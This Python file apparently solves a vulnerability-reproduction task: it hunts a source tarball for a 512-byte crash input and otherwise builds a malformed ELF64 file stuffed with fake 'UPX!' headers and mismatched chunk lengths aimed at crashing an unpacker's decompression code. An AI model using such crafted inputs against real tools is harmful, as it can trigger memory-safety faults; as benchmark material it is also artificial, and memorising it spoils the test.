import os
import io
import tarfile
import struct
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to locate a 512-byte PoC within the provided source tarball
        poc = self._find_512b_poc_in_tarball(src_path)
        if poc is not None and len(poc) == 512:
            return poc

        # Fallback: return a crafted 512-byte ELF64 binary with embedded UPX markers
        return self._build_elf64_poc(total_size=512)

    def _find_512b_poc_in_tarball(self, src_path: str) -> Optional[bytes]:
        if not src_path or not os.path.exists(src_path):
            return None
        try:
            with tarfile.open(src_path, "r:*") as tf:
                candidates = []
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name_lower = m.name.lower()
                    # Heuristic: likely PoC names
                    if any(s in name_lower for s in (
                        "poc", "crash", "ossfuzz", "fuzz", "testcase", "repro", "input", "seed"
                    )):
                        # Bound extraction size for safety
                        if m.size <= 65536:
                            f = tf.extractfile(m)
                            if f:
                                data = f.read()
                                if len(data) == 512:
                                    return data
                                candidates.append(data)
                # Fallback: prefer smallest candidate equal or close to 512 (cropping is unsafe, so only exact)
                for c in candidates:
                    if len(c) == 512:
                        return c
        except Exception:
            return None
        return None

    def _build_elf64_poc(self, total_size: int = 512) -> bytes:
        # Build a minimal ELF64 file with a single PT_LOAD segment and embed "UPX!" markers to
        # entice the vulnerable decompression paths. The file is exactly total_size bytes.
        if total_size < 120:
            total_size = 120  # minimum for EHDR + PHDR

        # ELF64 Header
        e_ident = bytearray(16)
        e_ident[0:4] = b"\x7fELF"
        e_ident[4] = 2   # ELFCLASS64
        e_ident[5] = 1   # ELFDATA2LSB (little-endian)
        e_ident[6] = 1   # EV_CURRENT
        e_ident[7] = 0   # System V
        # bytes 8..15 already zero

        # ELF header fields
        e_type = 3        # ET_DYN
        e_machine = 62    # EM_X86_64
        e_version = 1
        e_entry = 0
        e_phoff = 64
        e_shoff = 0
        e_flags = 0
        e_ehsize = 64
        e_phentsize = 56
        e_phnum = 1
        e_shentsize = 0
        e_shnum = 0
        e_shstrndx = 0

        ehdr = struct.pack(
            "<16sHHIQQQIHHHHHH",
            bytes(e_ident),
            e_type,
            e_machine,
            e_version,
            e_entry,
            e_phoff,
            e_shoff,
            e_flags,
            e_ehsize,
            e_phentsize,
            e_phnum,
            e_shentsize,
            e_shnum,
            e_shstrndx
        )

        # Program header (PT_LOAD)
        p_type = 1        # PT_LOAD
        p_flags = 5       # PF_R | PF_X
        p_offset = 0
        p_vaddr = 0x400000
        p_paddr = 0
        p_filesz = total_size
        p_memsz = total_size
        p_align = 0x200000

        phdr = struct.pack(
            "<IIQQQQQQ",
            p_type,
            p_flags,
            p_offset,
            p_vaddr,
            p_paddr,
            p_filesz,
            p_memsz,
            p_align
        )

        # Construct body with synthetic structures and "UPX!" markers.
        # We'll place a crafted header-like blob that loosely imitates UPX metadata.
        # Note: This is not a valid packed binary, but enough to exercise parsers heuristically.
        header = io.BytesIO()
        header.write(ehdr)
        header.write(phdr)

        # Remaining space
        remaining = total_size - header.tell()
        body = bytearray()

        # Insert a faux UPX-like block with fields that might confuse old parsers:
        # Signature
        body += b"UPX!"
        # Fake version and method bytes, deliberately conflicting patterns
        body += struct.pack("<I", 0x00040123)  # version-ish
        # Insert a series of chunk descriptors that mimic b_info with shifting methods
        for i in range(8):
            # b_method toggles to simulate missing reset in old code; levels vary
            b_method = (i * 3) & 0xFF
            b_level = (i * 7 + 1) & 0xFF
            # b_len, b_comp_len with crafted mismatches
            b_len = 0x200 + i * 0x10
            b_comp_len = 0x10  # suspiciously small
            body += struct.pack("<BBBBII", b_method, b_level, 0, 0, b_len, b_comp_len)

        # Add ELF "DT_INIT" style token in the stream to reach problematic path names
        body += b"\x7fELFDT_INIT\x00"

        # Pad with repeating UPX! to fill the rest
        upx_repeat = (remaining - len(body))
        if upx_repeat < 0:
            upx_repeat = 0
        # Ensure deterministic fill with "UPX!" then zeros
        upx_marker = (b"UPX!" * (upx_repeat // 4)) + (b"\x00" * (upx_repeat % 4))
        body += upx_marker

        # Compose final
        result = header.getvalue() + bytes(body)
        if len(result) < total_size:
            result += b"\x00" * (total_size - len(result))
        elif len(result) > total_size:
            result = result[:total_size]

        return result